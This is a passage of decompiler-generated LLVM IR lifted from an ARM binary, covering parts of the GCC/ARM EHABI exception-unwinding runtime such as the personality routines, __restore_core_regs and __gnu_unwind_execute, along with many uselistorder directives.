  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_214b8.340 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_183e8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18304, { 1, 0 }
  uselistorder label %dec_label_pc_182cc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18290, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_1820c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_1814c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18148, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_180a8, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18004, { 1, 0 }
  uselistorder label %dec_label_pc_18004.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18004.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_184a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_184a4:
  %v0_184a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_184a4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_184a4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_184a4, %bb
  %v10_184ac = phi i32 [ %arg1, %dec_label_pc_184a4 ], [ 0, %bb ]
  ret i32 %v10_184ac

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 28, 29, 30, 45, 23, 27, 46, 47, 48, 49, 50, 5, 4, 51, 42, 43, 31, 32, 24, 35, 34, 33, 36, 6, 8, 7, 20, 44, 25, 26, 12, 39, 19, 21, 22, 11, 10, 9, 13, 14, 15, 37, 16, 17, 18, 41, 38, 40, 52, 53 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 40, 14, 15, 16, 36, 37, 38, 39, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_184b4 = load i32, i32* @r1, align 4
  %v2_184b4 = load i32, i32* @r2, align 4
  %v4_184b4 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_184b4, i32 %v2_184b4, i32 2)
  ret i32 %v4_184b4
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_184bc = load i32, i32* @r1, align 4
  %v2_184bc = load i32, i32* @r2, align 4
  %v4_184bc = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_184bc, i32 %v2_184bc, i32 1)
  ret i32 %v4_184bc
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_184c4 = load i32, i32* @r1, align 4
  %v2_184c4 = load i32, i32* @r2, align 4
  %v4_184c4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_184c4, i32 %v2_184c4, i32 0)
  ret i32 %v4_184c4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 12, 10, 11, 57, 13, 0, 22, 14, 23, 58, 59, 60, 18, 19, 20, 21, 39, 40, 41, 42, 61, 62, 63, 77, 78, 79, 80, 1, 66, 67, 2, 68, 69, 3, 70, 64, 65, 33, 34, 4, 5, 6, 55, 56, 7, 8, 43, 44, 45, 71, 72, 73, 74, 75, 76, 35, 36, 37, 46, 47, 48, 54, 24, 15, 16, 17, 27, 28, 25, 26, 29, 30, 31, 32, 38, 9, 49, 50, 51, 52, 53 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_184cc = add i32 %tmp, 56
  %v4_184cc = inttoptr i32 %v3_184cc to i32*
  %v5_184cc = load i32, i32* %v4_184cc, align 4
  %v6_184cc = add i32 %tmp, 60
  %v7_184cc = inttoptr i32 %v6_184cc to i32*
  %v8_184cc = load i32, i32* %v7_184cc, align 4
  %v2_184d8 = load i32, i32* %arg1, align 4
  %v3_184d8 = add i32 %tmp, 4
  %v4_184d8 = inttoptr i32 %v3_184d8 to i32*
  %v5_184d8 = load i32, i32* %v4_184d8, align 4
  store i32 %v5_184d8, i32* @r1, align 4
  %v12_184d8 = add i32 %tmp, 16
  %v13_184d8 = inttoptr i32 %v12_184d8 to i32*
  %v14_184d8 = load i32, i32* %v13_184d8, align 4
  store i32 %v14_184d8, i32* @r4, align 4
  %v15_184d8 = add i32 %tmp, 20
  %v16_184d8 = inttoptr i32 %v15_184d8 to i32*
  %v17_184d8 = load i32, i32* %v16_184d8, align 4
  store i32 %v17_184d8, i32* @r5, align 4
  %v18_184d8 = add i32 %tmp, 24
  %v19_184d8 = inttoptr i32 %v18_184d8 to i32*
  %v20_184d8 = load i32, i32* %v19_184d8, align 4
  store i32 %v20_184d8, i32* @r6, align 4
  %v21_184d8 = add i32 %tmp, 28
  %v22_184d8 = inttoptr i32 %v21_184d8 to i32*
  %v23_184d8 = load i32, i32* %v22_184d8, align 4
  store i32 %v23_184d8, i32* @r7, align 4
  %v24_184d8 = add i32 %tmp, 32
  %v25_184d8 = inttoptr i32 %v24_184d8 to i32*
  %v26_184d8 = load i32, i32* %v25_184d8, align 4
  store i32 %v26_184d8, i32* @r8, align 4
  %v27_184d8 = add i32 %tmp, 36
  %v28_184d8 = inttoptr i32 %v27_184d8 to i32*
  %v29_184d8 = load i32, i32* %v28_184d8, align 4
  store i32 %v29_184d8, i32* @sb, align 4
  %v30_184d8 = add i32 %tmp, 40
  %v31_184d8 = inttoptr i32 %v30_184d8 to i32*
  %v32_184d8 = load i32, i32* %v31_184d8, align 4
  store i32 %v32_184d8, i32* @sl, align 4
  store i32 %v8_184cc, i32* @ip, align 4
  store i32 %v5_184cc, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_184cc)
  ret i32 %v2_184d8

; uselistorder directives
  uselistorder i32 %v8_184cc, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 48, 49, 50, 51, 13, 14, 5, 0, 54, 6, 52, 53, 11, 12, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 1, 88, 89, 90, 91, 92, 93, 94, 95, 96, 7, 97, 98, 101, 99, 100, 33, 34, 43, 44, 2, 37, 38, 39, 40, 41, 42, 35, 8, 17, 9, 36, 20, 10, 15, 16, 27, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 3, 18, 19, 45, 4, 46, 47 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 10, 15, 16, 17, 5, 18, 19, 0, 20, 22, 21, 23, 1, 24, 26, 25, 27 }
  uselistorder i32* @sb, { 124, 125, 126, 11, 12, 13, 14, 106, 107, 108, 109, 110, 111, 112, 113, 114, 117, 115, 116, 118, 90, 91, 64, 65, 1, 15, 16, 17, 18, 19, 20, 21, 22, 8, 5, 2, 3, 4, 6, 7, 9, 10, 24, 23, 29, 30, 25, 26, 27, 28, 31, 32, 33, 34, 35, 36, 39, 37, 38, 0, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 119, 120, 121, 122, 123 }
  uselistorder i32 36, { 15, 14, 4, 16, 6, 7, 5, 11, 13, 8, 12, 9, 0, 1, 2, 3, 10 }
  uselistorder i32* @r8, { 264, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 1, 263, 0, 33, 265, 10, 266, 11, 34, 35, 36, 37, 20, 21, 22, 23, 24, 25, 26, 27, 28, 3, 29, 30, 31, 32, 38, 39, 40, 41, 12, 267, 17, 18, 4, 19, 199, 200, 5, 201, 202, 203, 227, 228, 229, 230, 231, 9, 232, 233, 234, 235, 236, 237, 238, 239, 175, 176, 177, 178, 189, 190, 191, 192, 193, 132, 133, 134, 135, 42, 43, 44, 45, 13, 14, 87, 88, 89, 90, 91, 46, 47, 48, 49, 92, 93, 94, 95, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 16, 15, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 6, 80, 81, 82, 83, 84, 85, 86, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 7, 154, 155, 156, 157, 158, 159, 160, 161, 8, 162, 163, 164, 165, 166, 167, 2, 168, 169, 170, 171, 172, 173, 174, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 194, 195, 196, 197, 198, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 240, 241, 242, 243, 244, 245 }
  uselistorder i32 32, { 84, 81, 82, 83, 47, 85, 86, 43, 53, 87, 42, 78, 48, 44, 63, 61, 62, 58, 59, 60, 70, 71, 64, 65, 55, 56, 88, 68, 69, 49, 76, 77, 79, 2, 3, 5, 4, 80, 7, 6, 9, 8, 11, 10, 57, 45, 50, 46, 72, 13, 12, 15, 14, 17, 16, 19, 18, 54, 21, 20, 22, 24, 23, 25, 26, 28, 27, 66, 67, 73, 29, 30, 51, 31, 32, 33, 52, 34, 0, 35, 1, 36, 74, 37, 75, 38, 39, 40, 41 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 17, 33, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 96, 95, 97, 9, 10, 98, 1, 58, 59, 60, 61, 62, 63, 56, 57, 11, 64, 65, 75, 76, 66, 67, 8, 12, 94, 89, 90, 91, 2, 77, 78, 79, 38, 39, 13, 68, 69, 70, 53, 48, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 54, 55, 71, 72, 73, 74, 14, 15, 16, 0, 17, 18, 3, 19, 20, 21, 4, 22, 23, 5, 24, 25, 26, 27, 28, 29, 6, 80, 30, 81, 82, 83, 84, 31, 32, 7, 85, 33, 86, 34, 35, 36, 87, 88, 92, 37, 93 }
  uselistorder i32 20, { 125, 123, 124, 126, 1, 4, 9, 33, 127, 29, 128, 129, 130, 131, 5, 132, 133, 2, 134, 34, 10, 30, 31, 32, 35, 36, 37, 47, 48, 38, 39, 135, 116, 117, 118, 119, 120, 121, 122, 11, 112, 113, 114, 3, 49, 12, 50, 51, 0, 28, 41, 6, 43, 13, 44, 27, 42, 40, 45, 46, 52, 53, 14, 54, 55, 56, 57, 58, 59, 60, 61, 15, 62, 63, 64, 65, 66, 67, 16, 68, 69, 17, 70, 71, 72, 73, 18, 74, 75, 19, 76, 77, 78, 79, 80, 20, 81, 82, 83, 84, 85, 86, 21, 87, 88, 89, 90, 22, 23, 91, 7, 92, 24, 93, 94, 95, 96, 8, 97, 25, 98, 99, 100, 101, 102, 26, 103, 104, 105, 106, 107, 108, 109, 110, 111, 115 }
  uselistorder i32* @r1, { 169, 18, 16, 17, 4, 170, 171, 64, 65, 81, 44, 2, 173, 45, 172, 155, 46, 47, 48, 19, 66, 1, 67, 68, 20, 176, 25, 5, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 6, 194, 195, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 70, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 3, 80, 21, 107, 108, 196, 22, 198, 199, 200, 201, 130, 131, 29, 197, 23, 30, 31, 32, 162, 163, 164, 165, 166, 167, 168, 43, 99, 100, 157, 7, 153, 154, 8, 158, 161, 159, 9, 160, 83, 84, 24, 151, 85, 152, 156, 132, 133, 12, 33, 34, 35, 36, 37, 38, 39, 10, 204, 205, 206, 207, 0, 208, 26, 82, 109, 126, 202, 203, 174, 175, 27, 13, 86, 110, 111, 112, 113, 114, 28, 134, 135, 87, 88, 40, 41, 42, 89, 90, 91, 93, 94, 92, 136, 95, 96, 97, 98, 101, 102, 103, 14, 104, 105, 106, 115, 116, 117, 15, 118, 147, 148, 11, 119, 120, 121, 122, 123, 124, 125, 127, 128, 129, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 149, 150 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 3, 31, 32, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 9, 8, 2, 10, 11, 12, 13, 14, 28, 29, 25, 26, 4, 5, 1, 6, 0, 7, 27, 30 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_184e8 = load i32, i32* @r0, align 4
  ret i32 %v1_184e8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_184f0 = load i32, i32* @r0, align 4
  ret i32 %v1_184f0
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18504 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18508 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_18504, i32 0)
  ret i32 %v2_18508

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18528 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1852c = call i32 @__gnu_Unwind_Resume(i32 %v2_18528, i32 0)
  ret i32 %v2_1852c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1854c = ptrtoint i32* %stack_var_-68 to i32
  %v2_18550 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_1854c, i32 0)
  ret i32 %v2_18550

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18570 = ptrtoint i32* %stack_var_-68 to i32
  %v6_18574 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_18570, i32 %arg2, i8* %arg3, i32 %v2_18570)
  ret i32 %v6_18574

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_185a0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_185a8 = add i32 %tmp1, 76
  %v2_185a8 = inttoptr i32 %v1_185a8 to i32*
  %v3_185a8 = load i32, i32* %v2_185a8, align 4
  %v1_185ac = add i32 %v3_185a8, 7
  %v2_185ac = inttoptr i32 %v1_185ac to i8*
  %v3_185ac = load i8, i8* %v2_185ac, align 1
  %v4_185ac = zext i8 %v3_185ac to i32
  %v1_185b0 = add i32 %v3_185a8, 8
  %v3_185b4 = mul nuw nsw i32 %v4_185ac, 4
  %v2_185b8 = add i32 %v3_185b4, %v1_185b0
  %v3_185b8 = inttoptr i32 %v2_185b8 to i8*
  ret i8* %v3_185b8
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_185c8 = load i32, i32* @r6, align 4
  %v21_185c8 = load i32, i32* @lr, align 4
  %v0_185cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_185cc, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_185dc

dec_label_pc_185dc:                               ; preds = %dec_label_pc_185dc.backedge, %entry
  %v3_185e8 = phi i32 [ %v0_185dc.pre, %dec_label_pc_185dc.backedge ], [ %tmp, %entry ]
  %v1_185dc = add i32 %v3_185e8, 8
  %v2_185dc = inttoptr i32 %v1_185dc to i8*
  %v3_185dc = load i8, i8* %v2_185dc, align 1
  %v4_185dc = zext i8 %v3_185dc to i32
  store i32 %v4_185dc, i32* %r3.global-to-local, align 4
  %v2_185e0 = icmp eq i8 %v3_185dc, 0
  store i1 %v2_185e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_185e0, label %dec_label_pc_185f0, label %.thread

.thread:                                          ; preds = %dec_label_pc_185dc
  %v2_185e4 = add nsw i32 %v4_185dc, -1
  store i32 %v2_185e4, i32* %r3.global-to-local, align 4
  %v2_185e8 = trunc i32 %v2_185e4 to i8
  store i8 %v2_185e8, i8* %v2_185dc, align 1
  %v0_185ec.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_185ec.pr.pr, label %.thread.dec_label_pc_185f0_crit_edge, label %dec_label_pc_18618

.thread.dec_label_pc_185f0_crit_edge:             ; preds = %.thread
  %v0_185f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_185f0

dec_label_pc_185f0:                               ; preds = %.thread.dec_label_pc_185f0_crit_edge, %dec_label_pc_185dc
  %v0_185f0 = phi i32 [ %v0_185f0.pre, %.thread.dec_label_pc_185f0_crit_edge ], [ %v3_185e8, %dec_label_pc_185dc ]
  %v1_185f0 = add i32 %v0_185f0, 9
  %v2_185f0 = inttoptr i32 %v1_185f0 to i8*
  %v3_185f0 = load i8, i8* %v2_185f0, align 1
  %v4_185f0 = zext i8 %v3_185f0 to i32
  store i32 %v4_185f0, i32* %r3.global-to-local, align 4
  %v2_185f4 = icmp eq i8 %v3_185f0, 0
  store i1 %v2_185f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_185f4, label %dec_label_pc_186f8, label %dec_label_pc_185fc

dec_label_pc_185fc:                               ; preds = %dec_label_pc_186ec, %dec_label_pc_185f0
  %v2_18600 = phi i32 [ %v0_186ec, %dec_label_pc_186ec ], [ %v0_185f0, %dec_label_pc_185f0 ]
  %v0_185fc = phi i32 [ %v4_186ec, %dec_label_pc_186ec ], [ %v4_185f0, %dec_label_pc_185f0 ]
  %v1_185fc = add nsw i32 %v0_185fc, -1
  store i32 %v1_185fc, i32* %r3.global-to-local, align 4
  %v1_18600 = trunc i32 %v1_185fc to i8
  %v3_18600 = add i32 %v2_18600, 9
  %v4_18600 = inttoptr i32 %v3_18600 to i8*
  store i8 %v1_18600, i8* %v4_18600, align 1
  %v0_18604 = load i32, i32* @r5, align 4
  %v1_18604 = add i32 %v0_18604, 4
  %v2_18604 = inttoptr i32 %v1_18604 to i32*
  %v3_18604 = load i32, i32* %v2_18604, align 4
  store i32 %v3_18604, i32* %r2.global-to-local, align 4
  %v1_18608 = inttoptr i32 %v3_18604 to i32*
  %v2_18608 = load i32, i32* %v1_18608, align 4
  store i32 %v2_18608, i32* %r0.global-to-local, align 4
  %v4_18608 = add i32 %v3_18604, 4
  store i32 %v4_18608, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18610 = inttoptr i32 %v0_18604 to i32*
  store i32 %v2_18608, i32* %v1_18610, align 4
  %v5_18610 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18610, i32* %v2_18604, align 4
  %v0_18614 = load i32, i32* %r3.global-to-local, align 4
  %v1_18614 = trunc i32 %v0_18614 to i8
  %v2_18614 = load i32, i32* @r5, align 4
  %v3_18614 = add i32 %v2_18614, 8
  %v4_18614 = inttoptr i32 %v3_18614 to i8*
  store i8 %v1_18614, i8* %v4_18614, align 1
  br label %dec_label_pc_18618

dec_label_pc_18618:                               ; preds = %.thread, %dec_label_pc_185fc, %.thread6
  %v0_18618 = load i32, i32* @r5, align 4
  %v1_18618 = inttoptr i32 %v0_18618 to i32*
  %v2_18618 = load i32, i32* %v1_18618, align 4
  %v3_1861c = udiv i32 %v2_18618, 16777216
  store i32 %v3_1861c, i32* @r4, align 4
  store i32 %v3_1861c, i32* %ip.global-to-local, align 4
  %v3_18624 = mul i32 %v2_18618, 256
  store i32 %v3_18624, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_18618, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_18624, i32* %v1_18618, align 4
  br i1 %tmp183, label %dec_label_pc_186f8, label %dec_label_pc_18634

dec_label_pc_18634:                               ; preds = %dec_label_pc_18618
  %v0_18634 = load i32, i32* @r4, align 4
  %v1_18634 = and i32 %v0_18634, 128
  store i32 %v1_18634, i32* %r1.global-to-local, align 4
  %v2_18634 = icmp eq i32 %v1_18634, 0
  store i1 %v2_18634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18634, label %dec_label_pc_18710, label %dec_label_pc_1863c

dec_label_pc_1863c:                               ; preds = %dec_label_pc_18634
  %v1_1863c = and i32 %v0_18634, 240
  store i32 %v1_1863c, i32* @r6, align 4
  %v7_18640 = icmp eq i32 %v1_1863c, 128
  store i1 %v7_18640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18640, label %dec_label_pc_18648, label %dec_label_pc_1876c

dec_label_pc_18648:                               ; preds = %dec_label_pc_1863c
  %v0_18648 = load i32, i32* @r5, align 4
  %v1_18648 = add i32 %v0_18648, 8
  %v2_18648 = inttoptr i32 %v1_18648 to i8*
  %v3_18648 = load i8, i8* %v2_18648, align 1
  %v4_18648 = zext i8 %v3_18648 to i32
  store i32 %v4_18648, i32* %r3.global-to-local, align 4
  %v2_1864c = icmp eq i8 %v3_18648, 0
  store i1 %v2_1864c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1864c, label %dec_label_pc_1865c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18648
  %v2_18650 = add nsw i32 %v4_18648, -1
  store i32 %v2_18650, i32* %r3.global-to-local, align 4
  %v2_18654 = trunc i32 %v2_18650 to i8
  store i8 %v2_18654, i8* %v2_18648, align 1
  %v0_18658.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18658.pr.pr, label %.thread3.dec_label_pc_1865c_crit_edge, label %dec_label_pc_1868c

.thread3.dec_label_pc_1865c_crit_edge:            ; preds = %.thread3
  %v0_1865c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1865c

dec_label_pc_1865c:                               ; preds = %.thread3.dec_label_pc_1865c_crit_edge, %dec_label_pc_18648
  %v2_18670 = phi i32 [ %v0_1865c.pre, %.thread3.dec_label_pc_1865c_crit_edge ], [ %v0_18648, %dec_label_pc_18648 ]
  %v1_1865c = add i32 %v2_18670, 9
  %v2_1865c = inttoptr i32 %v1_1865c to i8*
  %v3_1865c = load i8, i8* %v2_1865c, align 1
  %v4_1865c = zext i8 %v3_1865c to i32
  store i32 %v4_1865c, i32* %r3.global-to-local, align 4
  %v2_18660 = icmp eq i8 %v3_1865c, 0
  store i1 %v2_18660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18660, label %dec_label_pc_1869c, label %dec_label_pc_1866c

dec_label_pc_1866c:                               ; preds = %dec_label_pc_1865c
  %v1_1866c = add nsw i32 %v4_1865c, -1
  store i32 %v1_1866c, i32* %r3.global-to-local, align 4
  %v1_18670 = trunc i32 %v1_1866c to i8
  store i8 %v1_18670, i8* %v2_1865c, align 1
  %v0_18674 = load i32, i32* @r5, align 4
  %v1_18674 = add i32 %v0_18674, 4
  %v2_18674 = inttoptr i32 %v1_18674 to i32*
  %v3_18674 = load i32, i32* %v2_18674, align 4
  store i32 %v3_18674, i32* %r2.global-to-local, align 4
  %v1_18678 = inttoptr i32 %v3_18674 to i32*
  %v2_18678 = load i32, i32* %v1_18678, align 4
  store i32 %v2_18678, i32* %r0.global-to-local, align 4
  %v4_18678 = add i32 %v3_18674, 4
  store i32 %v4_18678, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18678, i32* %v2_18674, align 4
  %v0_18684 = load i32, i32* %r3.global-to-local, align 4
  %v1_18684 = trunc i32 %v0_18684 to i8
  %v2_18684 = load i32, i32* @r5, align 4
  %v3_18684 = add i32 %v2_18684, 8
  %v4_18684 = inttoptr i32 %v3_18684 to i8*
  store i8 %v1_18684, i8* %v4_18684, align 1
  %v0_18688 = load i32, i32* %r0.global-to-local, align 4
  %v1_18688 = load i32, i32* @r5, align 4
  %v2_18688 = inttoptr i32 %v1_18688 to i32*
  store i32 %v0_18688, i32* %v2_18688, align 4
  br label %dec_label_pc_1868c

dec_label_pc_1868c:                               ; preds = %.thread3, %dec_label_pc_1866c
  %v0_1868c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1868c, i32* %r3.global-to-local, align 4
  %v3_18690 = mul i32 %v0_1868c, 256
  store i32 %v3_18690, i32* %r0.global-to-local, align 4
  %v1_18694 = load i32, i32* @r5, align 4
  %v2_18694 = inttoptr i32 %v1_18694 to i32*
  store i32 %v3_18690, i32* %v2_18694, align 4
  %v0_18698 = load i32, i32* %r3.global-to-local, align 4
  %v3_18698 = udiv i32 %v0_18698, 16777216
  br label %dec_label_pc_1869c

dec_label_pc_1869c:                               ; preds = %dec_label_pc_1865c, %dec_label_pc_1868c
  %storemerge133 = phi i32 [ %v3_18698, %dec_label_pc_1868c ], [ 176, %dec_label_pc_1865c ]
  %v1_1869c = load i32, i32* %ip.global-to-local, align 4
  %v4_1869c = mul i32 %v1_1869c, 256
  %v5_1869c = or i32 %v4_1869c, %storemerge133
  store i32 %v5_1869c, i32* %r2.global-to-local, align 4
  %v7_186a0 = icmp eq i32 %v5_1869c, 32768
  store i1 %v7_186a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_186a0, label %dec_label_pc_188ac, label %dec_label_pc_186a8

dec_label_pc_186a8:                               ; preds = %dec_label_pc_1869c
  %v3_186a8 = mul i32 %v5_1869c, 16
  store i32 %v3_186a8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_186b8 = and i32 %v3_186a8, 65520
  store i32 %v3_186b8, i32* %r2.global-to-local, align 4
  %v0_186bc = load i32, i32* @r7, align 4
  store i32 %v0_186bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
